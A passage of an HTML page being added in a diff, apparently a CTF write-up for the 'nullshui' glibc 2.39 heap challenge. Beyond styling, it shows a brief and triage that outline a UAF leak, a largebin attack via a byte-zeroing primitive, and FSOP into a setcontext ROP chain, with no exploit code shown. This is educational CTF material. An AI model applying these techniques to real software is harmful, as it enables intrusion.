@@ -1,0 +1,2052 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>NULLSHUI // HEAP EXPLOITATION</title>
+<meta name="description" content="OmniCTF 2026 // nullshui writeup // glibc 2.39 heap pwn: largebin corruption, libc/heap leak, FSOP setcontext ROP chain.">
+<meta name="theme-color" content="#ff3030">
+<link rel="icon" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23020100'/><text x='50%25' y='58%25' font-family='monospace' font-weight='800' font-size='18' text-anchor='middle' fill='%23ff3030'>N</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Rajdhani:wght@500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  /* ==========================================================================
+     TORCH-inspired cyberdeck palette
+     ========================================================================== */
+  :root {
+    --accent: #ff3030;
+    --accent-rgb: 255, 48, 48;
+    --accent-dim: rgba(255,48,48,0.12);
+    --accent-line: rgba(255,48,48,0.24);
+    --root: #ff3030;
+    --bg: #020100;
+    --panel: rgba(5, 5, 5, 0.76);
+    --panel-strong: rgba(8, 7, 6, 0.94);
+    --line: rgba(255,48,48,0.24);
+    --text: #e8e0d5;
+    --muted: #7f766a;
+    --good: #42ff9e;
+    --bad: #ff5a5a;
+    --info: #6bb6ff;
+    --font-mono: "JetBrains Mono", ui-monospace, Menlo, monospace;
+    --font-display: "Rajdhani", system-ui, sans-serif;
+  }
+
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 15px;
+    line-height: 1.6;
+    overflow-x: hidden;
+    min-height: 100vh;
+    background-image:
+      radial-gradient(1200px 600px at 12% -10%, rgba(255,48,48,0.08), transparent 60%),
+      radial-gradient(900px 500px at 110% 10%, rgba(255,48,48,0.05), transparent 70%),
+      repeating-linear-gradient(0deg, rgba(255,48,48,0.018) 0 1px, transparent 1px 3px);
+  }
+  ::selection { background: var(--accent); color: #000; }
+
+  /* ==========================================================================
+     Top HUD bar - mirrors t0rch chrome
+     ========================================================================== */
+  .hud {
+    position: sticky;
+    top: 0;
+    z-index: 50;
+    display: grid;
+    grid-template-columns: auto 1fr auto;
+    gap: 12px;
+    align-items: center;
+    padding: 10px 18px;
+    background: linear-gradient(180deg, rgba(8,7,6,0.96), rgba(8,7,6,0.78));
+    border-bottom: 1px solid var(--accent-line);
+    backdrop-filter: blur(8px);
+  }
+  .hud .brand {
+    display: flex; align-items: center; gap: 10px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 20px;
+    letter-spacing: 0.18em;
+    color: var(--accent);
+    text-shadow: 0 0 12px rgba(255,48,48,0.35);
+  }
+  .hud .brand .mark {
+    display: inline-grid; place-items: center;
+    width: 28px; height: 28px;
+    border: 1.5px solid var(--accent);
+    box-shadow: 0 0 12px rgba(255,48,48,0.4) inset, 0 0 12px rgba(255,48,48,0.2);
+    font-size: 14px;
+  }
+  .hud .nav { display: flex; gap: 14px; flex-wrap: wrap; justify-content: center; }
+  .hud .nav a {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 12px;
+    letter-spacing: 0.22em;
+    color: var(--text);
+    text-decoration: none;
+    padding: 4px 8px;
+    border-bottom: 1px solid transparent;
+    transition: color .15s, border-color .15s;
+  }
+  .hud .nav a:hover { color: var(--accent); border-color: var(--accent); }
+  .hud .nav a.active { color: var(--accent); border-color: var(--accent); }
+  .hud .status {
+    display: flex; gap: 8px; align-items: center; flex-wrap: wrap;
+  }
+  .chip {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    padding: 4px 8px;
+    border: 1px solid var(--accent-line);
+    background: var(--accent-dim);
+    color: var(--text);
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+  .chip.ok { color: var(--good); border-color: rgba(66,255,158,0.4); background: rgba(66,255,158,0.08); }
+  .chip.bad { color: var(--bad); border-color: rgba(255,90,90,0.4); background: rgba(255,90,90,0.08); }
+  .chip .dot {
+    display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+    background: currentColor; margin-right: 6px; vertical-align: middle;
+    box-shadow: 0 0 8px currentColor;
+  }
+
+  /* ==========================================================================
+     Hero / brief
+     ========================================================================== */
+  .brief {
+    max-width: 1180px;
+    margin: 28px auto 12px;
+    padding: 0 18px;
+    display: grid;
+    grid-template-columns: 1.4fr 1fr;
+    gap: 18px;
+  }
+  @media (max-width: 880px) { .brief { grid-template-columns: 1fr; } }
+  .panel {
+    position: relative;
+    background: var(--panel);
+    border: 1px solid var(--accent-line);
+    padding: 18px 20px;
+    backdrop-filter: blur(4px);
+  }
+  .panel::before {
+    content: "";
+    position: absolute; top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+  }
+  .panel h1 {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.16em;
+    font-size: 36px;
+    margin: 0 0 6px;
+    color: var(--accent);
+    text-transform: uppercase;
+  }
+  .panel .sub {
+    color: var(--muted);
+    font-size: 12px;
+    letter-spacing: 0.22em;
+    text-transform: uppercase;
+    margin-bottom: 14px;
+  }
+  .panel p { margin: 0 0 12px; }
+  .panel p.lede { font-size: 16px; }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px 18px; }
+  .grid-2 .row { display: flex; justify-content: space-between; gap: 8px; font-size: 13px; }
+  .grid-2 .k { color: var(--muted); letter-spacing: 0.14em; text-transform: uppercase; font-size: 11px; }
+  .grid-2 .v { color: var(--text); font-weight: 500; }
+  .grid-2 .v.accent { color: var(--accent); }
+
+  /* ==========================================================================
+     Section title
+     ========================================================================== */
+  main { max-width: 1180px; margin: 0 auto; padding: 0 18px 60px; }
+  section { margin: 24px 0; }
+  .sec-head {
+    display: flex; align-items: baseline; gap: 12px;
+    border-bottom: 1px dashed var(--accent-line);
+    padding-bottom: 8px; margin-bottom: 14px;
+  }
+  .sec-head .idx {
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 12px;
+    letter-spacing: 0.24em;
+    color: var(--accent);
+  }
+  .sec-head h2 {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.16em;
+    font-size: 22px;
+    text-transform: uppercase;
+    margin: 0;
+    color: var(--text);
+  }
+  .sec-head .tag {
+    margin-left: auto;
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+
+  /* ==========================================================================
+     Content typography
+     ========================================================================== */
+  .prose p { margin: 0 0 12px; }
+  .prose p + p { margin-top: 0; }
+  .prose strong { color: var(--accent); font-weight: 600; }
+  .prose code, .prose tt {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    background: rgba(255,48,48,0.06);
+    border: 1px solid rgba(255,48,48,0.12);
+    padding: 1px 5px;
+    color: #ffb3b3;
+  }
+  .prose .terminal {
+    background: #050402;
+    border: 1px solid var(--accent-line);
+    padding: 12px 14px;
+    margin: 10px 0;
+    overflow-x: auto;
+    white-space: pre;
+    font-size: 12.5px;
+    line-height: 1.55;
+    color: #c9c1b3;
+  }
+  .prose .terminal .prompt { color: var(--accent); }
+  .prose .terminal .ok { color: var(--good); }
+  .prose .terminal .bad { color: var(--bad); }
+  .prose .terminal .muted { color: var(--muted); }
+  .prose blockquote {
+    margin: 12px 0;
+    padding: 8px 14px;
+    border-left: 2px solid var(--accent);
+    background: rgba(255,48,48,0.04);
+    color: #d6cebf;
+  }
+
+  /* ==========================================================================
+     "Thinking" panel - shows how the solver reasoned
+     ========================================================================== */
+  .think {
+    border: 1px dashed rgba(107, 182, 255, 0.4);
+    background: rgba(107, 182, 255, 0.04);
+    padding: 10px 14px;
+    margin: 10px 0;
+    font-size: 13.5px;
+    color: #c7dcf2;
+  }
+  .think::before {
+    content: "// THINKING //";
+    display: block;
+    color: var(--info);
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    font-size: 10px;
+    margin-bottom: 6px;
+  }
+  .think .line { padding-left: 0; margin: 0; }
+  .think .line::before { content: "> "; color: var(--info); }
+  .think .line + .line { margin-top: 4px; }
+
+  /* ==========================================================================
+     Table: forward / inverse layer mapping
+     ========================================================================== */
+  table.layer-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 10px 0;
+    font-size: 13px;
+  }
+  table.layer-table th, table.layer-table td {
+    border: 1px solid var(--accent-line);
+    padding: 6px 10px;
+    text-align: left;
+    vertical-align: top;
+  }
+  table.layer-table th {
+    background: var(--accent-dim);
+    font-family: var(--font-display);
+    letter-spacing: 0.14em;
+    font-size: 11px;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  table.layer-table td.idx {
+    font-family: var(--font-display);
+    color: var(--accent);
+    width: 40px;
+    text-align: center;
+  }
+  table.layer-table tr:hover td { background: rgba(255,48,48,0.04); }
+
+  /* ==========================================================================
+     Pipeline diagram
+     ========================================================================== */
+  .pipeline {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    align-items: center;
+    padding: 12px;
+    border: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.3);
+    margin: 10px 0;
+  }
+  .pipeline .stage {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    padding: 6px 10px;
+    background: var(--accent-dim);
+    color: var(--accent);
+    border: 1px solid var(--accent-line);
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 78px;
+  }
+  .pipeline .arrow { color: var(--muted); font-family: var(--font-mono); }
+
+  /* ==========================================================================
+     Live terminal simulator
+     ========================================================================== */
+  .sim {
+    border: 1px solid var(--accent-line);
+    background: #050402;
+    margin: 14px 0 6px;
+    display: grid;
+    grid-template-rows: auto 1fr auto;
+  }
+  .sim .head {
+    display: flex; align-items: center; gap: 10px;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--accent-line);
+    background: rgba(255,48,48,0.05);
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+  .sim .head .dots { display: flex; gap: 5px; }
+  .sim .head .dots span { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); opacity: 0.5; }
+  .sim .head .dots span:nth-child(1) { opacity: 0.3; }
+  .sim .head .dots span:nth-child(3) { opacity: 0.8; }
+  .sim .head .title { color: var(--accent); font-weight: 700; }
+  .sim .body {
+    padding: 12px 14px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    line-height: 1.55;
+    color: #c9c1b3;
+    min-height: 260px;
+    max-height: 420px;
+    overflow: auto;
+    white-space: pre-wrap;
+  }
+  .sim .body .row { display: block; }
+  .sim .body .row .lbl { color: var(--accent); }
+  .sim .body .row .hex { color: #d6cebf; }
+  .sim .body .row.ok .lbl { color: var(--good); }
+  .sim .body .row.flag { color: var(--accent); font-weight: 700; }
+  .sim .controls {
+    display: flex; gap: 8px; flex-wrap: wrap;
+    padding: 8px 12px;
+    border-top: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.4);
+    align-items: center;
+  }
+  .sim .controls input {
+    flex: 1; min-width: 240px;
+    background: #020100;
+    color: var(--text);
+    border: 1px solid var(--accent-line);
+    padding: 6px 10px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+  }
+  .sim .controls input:focus { outline: none; border-color: var(--accent); }
+  .sim button {
+    background: var(--accent);
+    color: #000;
+    border: none;
+    padding: 7px 16px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    font-size: 11px;
+    letter-spacing: 0.22em;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: filter .15s;
+  }
+  .sim button:hover { filter: brightness(1.15); }
+  .sim button.ghost {
+    background: transparent;
+    color: var(--accent);
+    border: 1px solid var(--accent-line);
+  }
+
+  /* ==========================================================================
+     Connection map (signal flow)
+     ========================================================================== */
+  .map-legend {
+    display: flex; flex-wrap: wrap; gap: 12px;
+    margin-top: 10px;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+  }
+  .map-legend .item { display: inline-flex; align-items: center; gap: 6px; }
+  .map-legend .swatch { width: 12px; height: 12px; border: 1px solid var(--accent-line); }
+
+  /* ==========================================================================
+     Result panel (flag box)
+     ========================================================================== */
+  .result {
+    border: 1px solid var(--good);
+    background: linear-gradient(180deg, rgba(66,255,158,0.08), rgba(66,255,158,0.02));
+    padding: 16px 20px;
+    margin: 14px 0;
+  }
+  .result .label {
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    color: var(--good);
+    font-size: 11px;
+    margin-bottom: 6px;
+  }
+  .result .flag-text {
+    font-family: var(--font-mono);
+    font-size: 18px;
+    color: var(--accent);
+    word-break: break-all;
+    text-shadow: 0 0 14px rgba(255,48,48,0.35);
+  }
+
+  /* ==========================================================================
+     Hex stream decoration
+     ========================================================================== */
+  .hex-stream {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.12em;
+    opacity: 0.5;
+    padding: 6px 18px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .hex-stream.top { border-top: 1px solid var(--accent-line); margin-top: 18px; }
+
+  /* ==========================================================================
+     Bottom HUD strip
+     ========================================================================== */
+  footer.foot {
+    max-width: 1180px;
+    margin: 30px auto 0;
+    padding: 14px 18px 30px;
+    border-top: 1px solid var(--accent-line);
+    display: flex; flex-wrap: wrap; gap: 12px; justify-content: space-between; align-items: center;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+  footer.foot .meta { display: flex; gap: 14px; flex-wrap: wrap; }
+
+  /* ==========================================================================
+     Utility
+     ========================================================================== */
+  .row-flex { display: flex; gap: 12px; flex-wrap: wrap; }
+  .col-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media (max-width: 700px) { .col-2 { grid-template-columns: 1fr; } }
+  .muted { color: var(--muted); }
+  .accent { color: var(--accent); }
+  .good { color: var(--good); }
+  .bad { color: var(--bad); }
+  hr.div {
+    border: none; border-top: 1px dashed var(--accent-line); margin: 18px 0;
+  }
+
+  /* Cursor blink for live sim */
+  .blink { animation: blink 1s steps(1) infinite; }
+  /* Reduce motion: disable all of the new animations too */
+  @media (prefers-reduced-motion: reduce) {
+    .blink, .chip .dot, .chip.ok, .result, .think, .sec-head, .hex-stream,
+    .pipeline .stage, .sim .body .row, }
+
+  /* ==========================================================================
+     "Failed attempt" asides - show what the solver tried and discarded
+     ========================================================================== */
+  .aside-fail {
+    border: 1px solid rgba(255, 90, 90, 0.35);
+    background: linear-gradient(180deg, rgba(255,90,90,0.06), rgba(255,90,90,0.02));
+    padding: 10px 14px;
+    margin: 12px 0;
+    font-size: 13.5px;
+    color: #e3c7c7;
+  }
+  .aside-fail .aside-head {
+    display: block;
+    color: #ff7a7a;
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.22em;
+    font-size: 10px;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+  .aside-fail p { margin: 0 0 8px; }
+  .aside-fail p:last-child { margin-bottom: 0; }
+  .aside-fail p:first-of-type { color: #ffd9d9; }
+
+  /* ==========================================================================
+     Animations
+     ========================================================================== */
+
+  /* HUD status dot pulse */
+  @keyframes pulseDot {
+    0%, 100% { opacity: 1; box-shadow: 0 0 4px currentColor; }
+    50%      { opacity: 0.55; box-shadow: 0 0 12px currentColor; }
+  }
+  .chip .dot { animation: pulseDot 1.8s ease-in-out infinite; }
+
+  /* "ok" chip breathing border */
+  @keyframes pulseOk {
+    0%, 100% { box-shadow: 0 0 0 rgba(66,255,158,0); }
+    50%      { box-shadow: 0 0 10px rgba(66,255,158,0.35); }
+  }
+  .chip.ok { animation: pulseOk 2.4s ease-in-out infinite; }
+
+  /* Slow horizontal scanline sweep on body */
+  @keyframes scanSweep {
+    0%   { background-position: 0 0, 0 0, 0 0; }
+    100% { background-position: 0 0, 0 0, 0 6px; }
+  }
+  body { animation: scanSweep 6s linear infinite; }
+
+  /* Decorative hex stream slowly scrolling horizontally */
+  @keyframes hexScroll {
+    0%   { transform: translateX(0); }
+    100% { transform: translateX(-50%); }
+  }
+  .hex-stream { position: relative; overflow: hidden; }
+  .hex-stream .hex-track {
+    display: inline-block;
+    white-space: nowrap;
+    animation: hexScroll 40s linear infinite;
+  }
+  .hex-stream.top .hex-track {
+    padding-left: 100%;
+  }
+
+  /* Section head fade-in-up */
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .sec-head { animation: fadeInUp 0.5s ease-out both; }
+  .sec-head .idx { animation: fadeInUp 0.5s ease-out 0.1s both; }
+
+  /* Think panels slide in from left when rendered */
+  @keyframes thinkSlide {
+    from { opacity: 0; transform: translateX(-8px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
+  .think { animation: thinkSlide 0.45s ease-out both; }
+
+  /* Pipeline stage hover lift + glow */
+  .pipeline .stage {
+    transition: transform .18s ease, box-shadow .18s ease, background .18s ease;
+    cursor: default;
+  }
+  .pipeline .stage:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 14px rgba(255,48,48,0.4);
+    background: rgba(255,48,48,0.18);
+  }
+
+  /* Layer table row glow on hover */
+  table.layer-table tr {
+    transition: background .15s ease, transform .15s ease;
+  }
+  table.layer-table tbody tr:hover {
+    background: rgba(255,48,48,0.06);
+  }
+  table.layer-table tbody tr:hover td.idx {
+    color: #fff;
+    text-shadow: 0 0 10px var(--accent);
+  }
+
+  /* Result box breathing glow */
+  @keyframes breath {
+    0%, 100% { box-shadow: 0 0 0 rgba(66,255,158,0), inset 0 0 0 rgba(66,255,158,0); }
+    50%      { box-shadow: 0 0 22px rgba(66,255,158,0.25), inset 0 0 18px rgba(66,255,158,0.06); }
+  }
+  .result { animation: breath 3.4s ease-in-out infinite; }
+
+  /* Sim row reveal animation: each row briefly flashes on appear */
+  @keyframes rowReveal {
+    0%   { opacity: 0; transform: translateX(-6px); background: rgba(66,255,158,0.16); }
+    100% { opacity: 1; transform: translateX(0); background: transparent; }
+  }
+  .sim .body .row {
+    padding: 2px 4px;
+    margin-left: -4px;
+    border-left: 2px solid transparent;
+    transition: background .25s ease, border-color .25s ease;
+    animation: rowReveal 0.4s ease-out both;
+  }
+  .sim .body .row:hover {
+    background: rgba(255,48,48,0.06);
+    border-left-color: var(--accent);
+  }
+  .sim .body .row.flag {
+    background: rgba(66,255,158,0.10);
+    border-left-color: var(--good);
+    border-radius: 2px;
+  }
+  .sim .body .row.flag .flag-ascii { color: var(--good); font-weight: 700; }
+
+  /* Brief success flash when a row is the final flag */
+  @keyframes successFlash {
+    0%   { background: rgba(66,255,158,0.6); }
+    100% { background: rgba(66,255,158,0.1); }
+  }
+  .sim .body .row.flag { animation: rowReveal 0.4s ease-out both, successFlash 1.6s ease-out 0.4s both; }
+
+  /* Connection map */
+  /* Animated dashed flow on edges */
+  /* Info panel for map node details */
+  .info-panel {
+    position: relative;
+    margin-top: 12px;
+    padding: 12px 32px 12px 14px;
+    border: 1px solid var(--accent-line);
+    background: rgba(255,48,48,0.04);
+    font-size: 13px;
+    color: var(--text);
+    min-height: 0;
+    max-height: 0;
+    overflow: hidden;
+    opacity: 0;
+    transition: max-height .35s ease, opacity .25s ease, padding .25s ease, margin-top .25s ease;
+    padding-top: 0;
+    padding-bottom: 0;
+    line-height: 1.5;
+  }
+  .info-panel.show {
+    max-height: 480px;
+    opacity: 1;
+    padding-top: 12px;
+    padding-bottom: 12px;
+  }
+  .info-panel .ip-head {
+    display: flex; align-items: baseline; gap: 10px;
+    font-family: var(--font-display);
+    font-weight: 800;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--accent);
+    font-size: 12px;
+    margin-bottom: 8px;
+    flex-wrap: wrap;
+  }
+  .info-panel .ip-head .ip-id { color: var(--muted); font-size: 10px; letter-spacing: 0.12em; }
+  .info-panel .ip-head .ip-tag {
+    margin-left: auto;
+    font-size: 9px;
+    padding: 2px 6px;
+    border: 1px solid var(--accent-line);
+    color: var(--muted);
+    background: rgba(0,0,0,0.3);
+  }
+  .info-panel .ip-body p { margin: 0 0 8px; word-wrap: break-word; }
+  .info-panel .ip-body p:last-child { margin-bottom: 0; }
+  .info-panel .ip-body code { font-size: 12.5px; }
+  .info-panel .ip-flows {
+    display: flex; flex-wrap: wrap; gap: 6px;
+    margin-top: 10px;
+    font-size: 10px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+  }
+  .info-panel .ip-flows .label { color: var(--muted); margin-right: 4px; }
+  .info-panel .ip-flows .flow {
+    padding: 3px 8px;
+    border: 1px solid var(--accent-line);
+    background: rgba(0,0,0,0.3);
+    color: var(--text);
+    cursor: pointer;
+    transition: background .12s ease, color .12s ease, border-color .12s ease;
+  }
+  .info-panel .ip-flows .flow:hover {
+    background: var(--accent-dim);
+    color: var(--accent);
+    border-color: var(--accent);
+  }
+  .info-panel .ip-close {
+    position: absolute; top: 6px; right: 10px;
+    background: transparent; color: var(--muted);
+    border: 1px solid var(--accent-line);
+    width: 22px; height: 22px;
+    font-family: var(--font-mono);
+    font-size: 14px;
+    cursor: pointer;
+    line-height: 1;
+    padding: 0;
+  }
+  .info-panel .ip-close:hover { color: var(--accent); border-color: var(--accent); }
+
+  /* Map toolbar */
+  /* Sim toolbar: char counter, copy button */
+  .sim .controls .meta {
+    font-size: 10px; color: var(--muted); letter-spacing: 0.18em; text-transform: uppercase;
+    padding: 0 6px;
+  }
+  .sim .controls .meta.bad { color: var(--bad); }
+  .sim .controls .meta.ok  { color: var(--good); }
+
+  .map-wrap rect.pack { fill: rgba(var(--accent-rgb), 0.02); stroke: var(--accent-line); stroke-width: 1; rx: 5; ry: 5; }
+  .map-wrap text.pack-label { fill: var(--accent); font: 700 9px 'Rajdhani', sans-serif; letter-spacing: .24em; text-transform: uppercase; }
+  .map-wrap text.col-label { fill: var(--muted); font: 700 10px 'Rajdhani', sans-serif; letter-spacing: .18em; text-transform: uppercase; }
+  .map-wrap g.node { cursor: pointer; }
+  .map-wrap g.node rect { fill: rgba(var(--accent-rgb), 0.06); stroke: var(--accent); stroke-width: 1.5; transition: all .2s; }
+  .map-wrap g.node:hover rect { filter: drop-shadow(0 0 8px rgba(var(--accent-rgb), .45)); fill: rgba(var(--accent-rgb), 0.1); }
+  .map-wrap g.node.active rect { stroke-width: 2.5; filter: drop-shadow(0 0 12px rgba(var(--accent-rgb), .7)); fill: rgba(var(--accent-rgb), 0.15); }
+  .map-wrap g.node text.head { fill: var(--muted); font: 700 9px 'Rajdhani', sans-serif; letter-spacing: .18em; text-transform: uppercase; }
+  .map-wrap g.node text.title { fill: var(--accent); font: 700 12px 'Rajdhani', sans-serif; letter-spacing: .12em; text-transform: uppercase; }
+  .map-wrap g.node text.body { fill: var(--text); font: 11px 'JetBrains Mono', monospace; }
+  .map-wrap g.node text.label { fill: var(--muted); font: 9px 'JetBrains Mono', monospace; letter-spacing: .14em; }
+  .map-wrap path.edge { stroke: var(--accent); stroke-width: 1.2; fill: none; opacity: 0.85; marker-end: url(#arr); transition: stroke .3s, opacity .3s; }
+  .map-wrap path.edge.faint { stroke: var(--edge-faint, #8a7e96); stroke-width: 1; fill: none; opacity: 0.5; stroke-dasharray: 3 3; marker-end: url(#arr-faint); }
+  .map-wrap text.edge-label { fill: var(--muted); font: 9px 'JetBrains Mono', monospace; letter-spacing: .14em; text-transform: uppercase; pointer-events: none; }
+  .map-wrap marker path { transition: fill .3s; }
+  .map-wrap path.edge.flowing { stroke: var(--accent); stroke-width: 1.8; opacity: 1; stroke-dasharray: 6 4; animation: flowDash .6s linear infinite; }
+  .map-wrap path.edge.faint.flowing { stroke: var(--accent-dim, #b86bff99); stroke-dasharray: 4 3; }
+  .map-wrap {  }
+  .map-wrap svg { display:block; width:100%; height:auto; }
+  .map-wrap { width:100%; overflow-x:auto; overflow-y:visible; }
+  .map-wrap { overflow-x:auto; overflow-y:visible; -webkit-overflow-scrolling:touch; }
+  .map-wrap svg { display: block; width: 100%; height: auto; }
+  #map-info, .node-info { margin-top: 10px; padding: 0 14px; border: 1px solid var(--accent-line); background: rgba(var(--accent-rgb), 0.04); font-size: 13px; color: var(--text); max-height: 0; overflow: hidden; opacity: 0; transition: max-height .3s, opacity .2s, padding .25s; line-height: 1.5; }
+  #map-info.show, .node-info.show { max-height: 400px; opacity: 1; padding: 10px 14px; }
+  #map-info .mi-hd { display: flex; align-items: center; gap: 10px; }
+  #map-info .mi-ti { font-family: var(--font-display); font-weight: 800; letter-spacing: .14em; text-transform: uppercase; color: var(--accent); font-size: 11px; }
+  #map-info .mi-tg { margin-left: auto; font-size: 10px; padding: 2px 6px; border: 1px solid var(--accent-line); color: var(--muted); background: rgba(0,0,0,.3); }
+  #map-info .mi-cl { background: transparent; color: var(--muted); border: 1px solid var(--accent-line); padding: 2px 8px; font-family: var(--font-display); font-weight: 700; font-size: 9px; letter-spacing: .14em; text-transform: uppercase; cursor: pointer; }
+  #map-info .mi-cl:hover { color: var(--accent); border-color: var(--accent); }
+  #map-info .mi-bd { margin-top: 6px; word-wrap: break-word; }
+  @keyframes blink { 50% { opacity: 0; } }
+  @keyframes flowDash { to { stroke-dashoffset: -10; } }
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     TOP HUD
+     ============================================================ -->
+<header class="hud" role="banner">
+  <div class="brand">
+    <span class="mark">N</span>
+    <span>NULLSHUI // WRITEUP</span>
+  </div>
+  <nav class="nav" aria-label="Sections">
+    <a href="#brief">brief</a>
+    <a href="#triage">triage</a>
+    <a href="#root-cause">root cause</a>
+    <a href="#exploit-chain">exploit chain</a>
+    <a href="#sim">sim</a>
+    <a href="#signal">map</a>
+    <a href="#solver">solver</a>
+    <a href="#flag">flag</a>
+  </nav>
+  <div class="status">
+    <span class="chip ok"><span class="dot"></span>solved</span>
+    <span class="chip"><span class="dot"></span>pwn // heap</span>
+    <span class="chip">omni 2026</span>
+  </div>
+</header>
+
+<!-- ============================================================
+     HERO / BRIEF
+     ============================================================ -->
+<section class="brief" id="brief">
+  <div class="panel">
+    <div class="sub">// root // challenge 04 // omnictf 2026</div>
+    <h1>Nullshui &mdash; nothing in the right place</h1>
+    <p class="lede">A modern glibc heap challenge built around a single, highly constrained primitive: the ability to clear specific bytes within an active chunk. The zero primitive lets us precisely corrupt <code>fd_nextsize</code> on a live large-bin node without destroying surrounding allocator metadata.</p>
+    <p>What I actually do: leak libc and heap bases via UAF view, trigger a largebin attack with the zero primitive to overlap chunks, and leverage a forged FILE structure alongside wide-data FSOP to pop a setcontext ROP chain.</p>
+    <div class="row-flex" style="margin-top:10px">
+      <span class="chip ok"><span class="dot"></span>flag recovered</span>
+      <span class="chip"><span class="dot"></span>zero primitive</span>
+      <span class="chip"><span class="dot"></span>largebin attack</span>
+      <span class="chip bad"><span class="dot"></span>glibc 2.39</span>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="sub">// challenge matrix</div>
+    <div class="grid-2">
+      <div class="row"><span class="k">visible iface</span><span class="v">allocate, free, view, zero</span></div>
+      <div class="row"><span class="k">vuln type</span><span class="v accent">metadata corruption</span></div>
+      <div class="row"><span class="k">binary</span><span class="v">stripped ELF x86-64</span></div>
+      <div class="row"><span class="k">libc</span><span class="v bad">glibc 2.39 (Ubuntu Noble)</span></div>
+      <div class="row"><span class="k">approach</span><span class="v">largebin -> FSOP -> ROP</span></div>
+      <div class="row"><span class="k">time to solve</span><span class="v">~2h end to end</span></div>
+      <div class="row"><span class="k">core idea</span><span class="v">corrupt fd_nextsize via zero primitive</span></div>
+      <div class="row"><span class="k">remote</span><span class="v">flag dumped to stdout via ROP</span></div>
+    </div>
+  </div>
+</section>
+
+<main>
+
+<section id="triage">
+  <div class="sec-head">
+    <span class="idx">01 //</span>
+    <h2>triage</h2>
+    <span class="tag">phase / recon</span>
+  </div>
+  <div class="panel prose">
+    <p>I grabbed the handout tarball and extracted a stripped 64-bit ELF. The binary gives four menu options: allocate, free, view, and zero. That is the whole surface. No edit, no copy, nothing convenient.</p>
+    <p>Running <code>checksec</code> confirmed the full protection stack: PIE on, full RELRO, NX, stack canary. The GOT is read-only so I cannot overwrite a function pointer there. I need a different path to code execution.</p>
+    <p>The description says "nothing is more dangerous than nothing in the right place." That is a direct hint toward a null-byte or zero primitive. The zero option clears bytes in a live chunk. Once I understood that, the rough shape of the exploit clicked: use zero to corrupt allocator metadata, get an overlap, forge a FILE structure, and hijack control through FSOP.</p>
+    <table>
+      <thead><tr><th>property</th><th>value</th></tr></thead>
+      <tbody>
+        <tr><td>binary</td><td>stripped ELF x86-64, PIE</td></tr>
+        <tr><td>libc</td><td>glibc 2.39-0ubuntu8.7 (Ubuntu Noble)</td></tr>
+        <tr><td>protections</td><td>PIE + Full RELRO + NX + Canary</td></tr>
+        <tr><td>interface</td><td>allocate / free / view / zero</td></tr>
+        <tr><td>category</td><td>Binary Exploitation / heap pwn</td></tr>
+        <tr><td>points</td><td>99 pts / 50 solves</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section id="root-cause">
+  <div class="sec-head">
+    <span class="idx">02 //</span>
+    <h2>root cause</h2>
